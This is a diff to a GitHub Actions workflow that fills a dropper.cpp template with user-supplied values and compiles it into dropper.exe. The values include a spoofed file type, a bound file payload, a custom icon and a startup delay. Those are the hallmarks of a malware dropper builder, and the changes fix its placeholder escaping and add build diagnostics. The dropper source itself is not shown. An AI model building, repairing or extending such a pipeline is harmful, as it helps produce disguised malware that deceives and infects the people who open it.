@@ -34,25 +34,32 @@ jobs:
       - name: Replace placeholders
         run: |
           $content = Get-Content -Path dropper.cpp -Raw
-          $content = $content -replace '{{FILE_NAME}}', '${{ github.event.inputs.file_name }}'
-          $content = $content -replace '{{STARTUP_DELAY_MS}}', '${{ github.event.inputs.startup_delay_ms }}'
-          $content = $content -replace '{{SPOOFED_FILE_TYPE}}', '${{ github.event.inputs.spoofed_file_type }}'
+          $content = $content -replace [regex]::Escape('{{FILE_NAME}}'), [regex]::Escape('${{ github.event.inputs.file_name }}')
+          $content = $content -replace [regex]::Escape('{{STARTUP_DELAY_MS}}'), '${{ github.event.inputs.startup_delay_ms }}'
+          $content = $content -replace [regex]::Escape('{{SPOOFED_FILE_TYPE}}'), [regex]::Escape('${{ github.event.inputs.spoofed_file_type }}')
           if ('${{ github.event.inputs.icon_data }}' -ne '') {
-              $content = $content -replace '{{ICON_DATA}}', '${{ github.event.inputs.icon_data }}'
+              $content = $content -replace [regex]::Escape('{{ICON_DATA}}'), [regex]::Escape('${{ github.event.inputs.icon_data }}')
           }
           if ('${{ github.event.inputs.bound_file_data }}' -ne '') {
-              $content = $content -replace '{{BOUND_FILE_DATA}}', '${{ github.event.inputs.bound_file_data }}'
+              $content = $content -replace [regex]::Escape('{{BOUND_FILE_DATA}}'), [regex]::Escape('${{ github.event.inputs.bound_file_data }}')
           }
           Set-Content -Path dropper.cpp -Value $content
+          Write-Host "=== Modified dropper.cpp ==="
+          Get-Content -Path dropper.cpp
 
       - name: Set up MSVC
         uses: ilammy/msvc-dev-cmd@v1
 
       - name: Compile dropper.cpp
         run: |
-          cl.exe /O2 /out:dropper.exe dropper.cpp
+          cl.exe /O2 /Fe:dropper.exe dropper.cpp 2>&1
+          if ($LASTEXITCODE -ne 0) {
+              Write-Error "Compilation failed with exit code $LASTEXITCODE"
+              exit 1
+          }
           if (-Not (Test-Path dropper.exe)) {
-              Write-Error "Compilation failed - dropper.exe not created"
+              Write-Error "dropper.exe was not created"
+              Get-ChildItem -Path .
               exit 1
           }
 
